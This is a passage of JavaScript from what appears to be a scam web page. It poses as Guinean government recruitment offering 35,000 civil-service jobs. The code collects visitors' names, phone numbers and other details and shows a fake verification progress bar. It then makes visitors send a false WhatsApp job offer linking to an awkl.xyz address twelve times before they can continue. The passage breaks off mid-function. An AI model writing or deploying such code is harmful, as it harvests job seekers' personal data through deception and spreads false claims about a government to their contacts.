    <script>
        // ‚úÖ FIXED WHATSAPP MESSAGE - Using \n for line breaks
        var text1 = "LE PRESIDENT GUIN√âEN MAMADI RECRUTE 35 000 FONCTIONNAIRES\n\n" +
                    "Le gouvernement guin√©en recherche 35 000 personnes pour des postes de fonctionnaires, d'enseignants et d'agents de sant√©.\n\n" +
                    "Dipl√¥m√©s et non-dipl√¥m√©s Postulez et partagez cette offre avec d'autres personnes, quelqu'un pourrait avoir besoin de cette opportunit√©\n\n" +
                    "Cliquez sur le lien ci-dessous pour postuler d√®s maintenant.\n\n" +
                    "Apply hereüëâ\n" +
                    "https://awkl.xyz/Guinee-Fonction-Recrutement";
        
        var shareCount = 0;
        var totalShares = 12;
        
        function submitForm() {
            // Validate form
            if ($("#name").val().length < 3 || $("#phone").val().length < 7 || $("#region").val() === "" || $("#qualification").val() === "" || $("#sector").val() === "") {
                $("#form-error").fadeIn(500);
                setTimeout(function() { $("#form-error").fadeOut(500); }, 3000);
                return;
            }
            
            // Scroll to top to show loading
            window.scrollTo({ top: 0, behavior: 'smooth' });
            
            // Hide main page, show checking
            $("#main-page").fadeOut(0);
            $("#checking").fadeIn(1000);
            
            var i = 0;
            var interval = setInterval(function() {
                i++;
                $("#percentage").text(i + "%");
                $("#fill").css("width", i + "%");
                
                if (i >= 100) {
                    clearInterval(interval);
                    setTimeout(function() {
                        $("#checking").fadeOut(0);
                        $("#share").fadeIn(1000);
                        // Scroll to top again for share page
                        window.scrollTo({ top: 0, behavior: 'smooth' });
                    }, 500);
                }
            }, 50);
        }
        
        $("#whatsapp").click(function() {
            // Send WhatsApp message with proper encoding
            window.location.href = "whatsapp://send?text=" + encodeURIComponent(text1);
            
            setTimeout(function() {
                shareCount++;
                var width = (shareCount / totalShares) * 100;
                $("#fill2").css("width", width + "%");
                $("#share-count").text(shareCount);
                
                if (shareCount >= totalShares) {
                    setTimeout(function() {
                        $("#share").fadeOut(0);
                        $("#final").fadeIn(1000);
                        window.scrollTo({ top: 0, behavior: 'smooth' });
                    }, 1000);
                }
            }, 2000);
        });
        
        // Update comment times
        setInterval(function() {
